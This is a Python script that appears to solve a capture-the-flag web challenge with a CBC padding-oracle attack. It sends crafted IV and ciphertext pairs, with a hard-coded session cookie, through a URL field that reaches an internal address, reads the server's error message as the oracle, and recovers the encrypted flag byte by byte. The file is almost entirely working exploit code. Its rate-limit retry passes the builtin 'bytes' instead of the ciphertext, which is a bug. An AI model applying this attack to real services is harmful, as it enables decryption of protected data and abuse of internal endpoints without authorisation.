import base64
import time
import urllib.parse

import requests

BLOCK_SIZE = 16
IV = b'\x18\xcf\xd0Q\xc5\xe3\x8c\xc5\x99O-\x18\xbc\xb3,\xc3'
FLAG = b'\xfd\x00\xa4\\zPK\xed\x9e\x8b\xbc\xd4\x18\xc6\x04\xd6\x9d\xc1\x00\xbc\x02\xfd"\xd4\x8bA\x8d\x1er\xdf\xe1\xaa\\\x87GL\x7fa\x10p\x1e\xd2=\x03Q\xc4U\xd4'

def oracle(iv: bytes, content: bytes) -> bool:
    message = "|".join([
        base64.b64encode(iv).decode(),
        base64.b64encode(content).decode()
    ])
    r = requests.post(
        "https://webdept.q.2022.ugractf.ru/89fc6f3da914ca2dbb136817e53d92aa/dashboard",
        cookies={
            "AIOHTTP_SESSION": "gAAAAABiHVSNt2ra9ziidCnV71CxMkcfuXdT3A4QYXnp7GwvqHPGlrAJDVuAM0xqnQLm-J8zTyuNYunuSv2QGbHbI4IOp2_Eu5SuHAAsxo2OygkPYE6k-S6bX6tnz8D3Wq-crNUGRfLP18WHWnv-_UPl9rnv9jhGsg=="
        },
        data={
            "url": "http://10.13.38.116/?" + urllib.parse.urlencode({"enc": message})
        }
    )

    if r.status_code == 503:
        print(" [!] Rate limited")
        time.sleep(0.5)
        return oracle(iv, bytes)
    elif "Sign in" in r.text:
        print(" [!] Signed out")
        raise ValueError()

    time.sleep(0.05) # rate limiter
    return "Данное сообщение не может быть расшифровано." not in r.text

def exploit(data: bytes) -> bytes:
    decrypted = bytes()

    for pos in range(len(data) - BLOCK_SIZE, 0, -BLOCK_SIZE):
        attacked_block = data[pos:pos+BLOCK_SIZE]
        previous_block = data[pos-BLOCK_SIZE:pos]

        modified_block = bytearray(previous_block)
        plain_block = bytearray(BLOCK_SIZE)

        for padding in range(1, BLOCK_SIZE + 1):
            for value in range(256):
                modified_block[-padding] = (modified_block[-padding] + 1) % 256
                print("     Trying", value, "for", pos, "-", padding)
                if oracle(modified_block, attacked_block):
                    plain_block[padding - 1] = modified_block[-padding] ^ previous_block[-padding] ^ padding
                    print(" [*] Extracted:", plain_block[padding - 1])

                    for k in range(1, padding + 1):
                        modified_block[-k] = (padding + 1) ^ plain_block[k - 1] ^ previous_block[-k]

                    break

        decrypted += bytes(plain_block)

    return decrypted[::-1]


if __name__ == "__main__":
    print(exploit(IV + FLAG))
